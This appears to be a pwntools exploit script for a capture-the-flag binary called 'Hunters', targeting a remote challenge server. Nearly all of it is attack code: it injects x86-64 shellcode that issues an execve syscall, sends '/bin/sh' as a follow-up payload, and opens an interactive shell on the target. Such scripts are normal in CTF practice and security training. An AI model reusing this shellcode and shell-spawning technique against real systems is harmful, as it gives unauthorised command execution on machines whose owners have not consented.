#!/usr/bin/python3
import pwn
pwn.context.terminal = ['tmux','splitw','-h']

elf = pwn.context.binary =pwn.ELF("./Hunters")

if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path,gdbscript='c\n')
elif pwn.args.REMOTE:
    io = pwn.remote("chall.nitdgplug.org",30090)
else:
    io = elf.process()
payload1 = pwn.asm('''
    lea rdi,[rip+0x19]
    mov al, 0x3b
    xor esi,esi
    xor edx,edx
    syscall
    syscall
    syscall
''')
io.sendlineafter(b": ",payload1)
payload2 =b'/bin/sh\0'
io.sendlineafter(b": ",payload2)

io.interactive()